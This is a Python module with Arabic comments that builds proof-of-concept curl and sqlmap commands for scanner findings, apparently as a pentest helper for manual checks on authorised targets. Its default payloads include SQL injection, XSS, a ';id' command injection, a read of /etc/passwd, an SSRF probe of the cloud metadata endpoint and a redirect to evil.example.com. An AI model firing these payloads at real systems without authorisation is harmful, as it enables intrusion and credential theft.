"""توليد Proof-of-Concept (PoC) لكل نتيجة — أوامر جاهزة ليختبرها الباحث بنفسه.

نقّي وحتمي (بلا LLM): يبني أمر curl (وأحيانًا sqlmap) انطلاقًا من نوع الثغرة
والـ endpoint والدليل (param/payload). الهدف تقليل الأخطاء: يتأكّد الباحث بثانية.

ملاحظة: الأوامر **للتشغيل اليدوي من الباحث** على هدف مصرّح به — لا يشغّلها النظام.
"""

from __future__ import annotations

import re
from urllib.parse import urlsplit, urlunsplit

_COOKIE_HINT = "ضع كوكي جلستك هنا (PHPSESSID=...; security=low)"


def _parse_evidence(evidence: str | None) -> tuple[str | None, str | None]:
    """يستخرج اسم البارامتر والحمولة (payload) من نصّ الدليل إن توفّرا."""
    param = payload = None
    ev = evidence or ""
    m = re.search(r"\b(?:param|parameter)\s*=\s*([^;|]+)", ev, re.IGNORECASE)
    if m:
        param = m.group(1).strip()
    m = re.search(r"\b(?:attack|payload)\s*=\s*([^;|]+)", ev, re.IGNORECASE)
    if m:
        payload = m.group(1).strip()
    return param, payload


def _base_url(host: str | None, endpoint: str | None) -> str:
    if endpoint:
        return endpoint
    if host:
        return host if "://" in host else f"http://{host}"
    return ""


def _strip_query(url: str) -> str:
    p = urlsplit(url)
    return urlunsplit((p.scheme, p.netloc, p.path, "", ""))


def build_poc(
    vuln_type: str | None,
    host: str | None,
    endpoint: str | None,
    evidence: str | None = None,
) -> str:
    """يبني نص PoC (أوامر curl/sqlmap + ملاحظة) لنتيجة واحدة."""
    url = _base_url(host, endpoint)
    if not url:
        return "# لا يوجد endpoint كافٍ لتوليد PoC — راجِع الدليل يدويًا."
    vt = (vuln_type or "").lower()
    param, payload = _parse_evidence(evidence)
    base = _strip_query(url)
    lines: list[str] = [f"# PoC — {vuln_type or 'finding'} @ {host or url}",
                        f"# الكوكي للجلسة المُصادَقة: -b '{_COOKIE_HINT}'"]

    def _curl_param(pl: str) -> str:
        if param:
            return f"curl -i -s -k -G \"{base}\" --data-urlencode \"{param}={pl}\" -b '{_COOKIE_HINT}'"
        return f"curl -i -s -k \"{url}\" -b '{_COOKIE_HINT}'"

    if any(k in vt for k in ("sql", "sqli")):
        pl = payload or "1' OR '1'='1' -- -"
        lines.append(_curl_param(pl))
        if param:
            lines.append(
                f"sqlmap -u \"{url}\" -p {param} --batch --risk=2 --level=3 "
                f"--cookie='{_COOKIE_HINT}'"
            )
        lines.append("# دليل النجاح: تغيّر الاستجابة/تسريب صفوف، أو تأخّر زمني مع حمولة SLEEP.")
    elif any(k in vt for k in ("xss", "cross-site script")):
        pl = payload or "<script>alert(document.domain)</script>"
        lines.append(_curl_param(pl))
        lines.append("# افتح الرابط بالمتصفّح وتأكّد أن الحمولة انعكست ونُفِّذت (alert).")
    elif any(k in vt for k in ("command", "rce", "exec", "injection")) and "sql" not in vt:
        pl = payload or ";id"
        lines.append(_curl_param(pl))
        lines.append("# لو نموذج POST: " + f"curl -i -s -k -X POST \"{base}\" --data \"{(param or 'ip')}={pl}\" -b '{_COOKIE_HINT}'")
        lines.append("# دليل النجاح: ظهور مخرجات الأمر (مثل uid=…).")
    elif any(k in vt for k in ("lfi", "traversal", "file")):
        pl = payload or "../../../../etc/passwd"
        lines.append(_curl_param(pl))
        lines.append("# دليل النجاح: ظهور محتوى ملف نظام (مثل root:x:0:0).")
    elif any(k in vt for k in ("ssrf",)):
        pl = payload or "http://169.254.169.254/latest/meta-data/"
        lines.append(_curl_param(pl))
        lines.append("# دليل النجاح: استجابة من خدمة داخلية/metadata.")
    elif any(k in vt for k in ("redirect",)):
        pl = payload or "https://evil.example.com"
        lines.append(_curl_param(pl))
        lines.append("# دليل النجاح: Location يشير إلى نطاق خارجي يتحكّم به المهاجم.")
    else:
        lines.append(f"curl -i -s -k \"{url}\" -b '{_COOKIE_HINT}'")
        if payload and param:
            lines.append(_curl_param(payload))
        lines.append("# أعد إنتاج الدليل أدناه يدويًا للتأكّد.")

    if evidence:
        lines.append(f"# الدليل الخام: {evidence}")
    return "\n".join(lines)
